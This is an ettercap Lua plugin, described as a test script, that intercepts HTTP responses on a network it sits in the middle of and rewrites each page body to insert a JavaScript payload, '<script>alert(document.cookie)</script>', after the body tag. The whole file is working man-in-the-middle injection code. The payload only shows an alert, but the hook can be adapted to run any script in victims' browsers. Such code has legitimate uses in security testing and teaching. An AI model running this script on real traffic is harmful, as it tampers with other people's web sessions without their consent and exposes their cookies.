description = "This is a test script that will inject HTTP stuff";


local eclib = require('eclib')
local hook_points = require("hook_points")
local shortpacket = require("shortpacket")
local shortsession = require("shortsession")
local packet = require("packet")

-- We have to hook at the filtering point so that we are certain that all the 
-- dissectors hae run.
hook_point = hook_points.filter

function split_http(str)
  local start,finish,header,body = string.find(str, '(.-\r?\n\r?\n)(.*)')
  return start,finish,header, body
end

function shrink_http_body(body)
  local modified_body = string.gsub(body, '>%s*<','><')
  return modified_body
end

-- Cache our starts-with function...
local sw = shortpacket.data_starts_with("HTTP/1.")
-- We only want to match packets that look like HTTP responses.
packetrule = function(packet_object)
  if packet.is_tcp(packet_object) == false then
    return false
  end
  -- Check to see if it starts with the right stuff.
  return sw(packet_object)
end

local session_key = shortsession.ip_session("inject_http")

-- Here's your action.
action = function(po) 
  local session_id = session_key(po)
  if not session_id then
    -- If we don't have session_id, then bail.
    return nil
  end
  --local src_ip = ""
  --local dst_ip = ""
  local src_ip = packet.src_ip(po)
  local dst_ip = packet.dst_ip(po)
  
  ettercap.log("inject_http: " .. src_ip .. " -> " .. dst_ip .. "\n")
  -- Get the full buffer....
  reg = ettercap.reg.create_namespace(session_id)
  local buf = packet.read_data(po)
  -- Split the header/body up so we can manipulate things.
  local start,finish,header, body = split_http(buf)
  -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
  if not reg['a'] then
	ettercap.log("Initial hit\n")
	reg['a'] = 1	
  else
	ettercap.log(tostring(reg['a']) .. " hit\n")
	reg['a'] = reg['a'] + 1
  end
	
  if (not (start == nil)) then
    -- We've got a proper split.
    local orig_body_len = string.len(body)

    local modified_body = string.gsub(body, '<body>','<body><script>alert(document.cookie)</script>')
    -- We've tweaked things, so let's update the data.
    if (not(modified_body == body)) then
      ettercap.log("inject_http action : We modified the HTTP response!\n")
      local modified_data = header .. modified_body

      -- This takes care of setting the packet data, as well as flagging it 
      -- as modified.
      packet.set_data(po, modified_data)
    end
  end
end
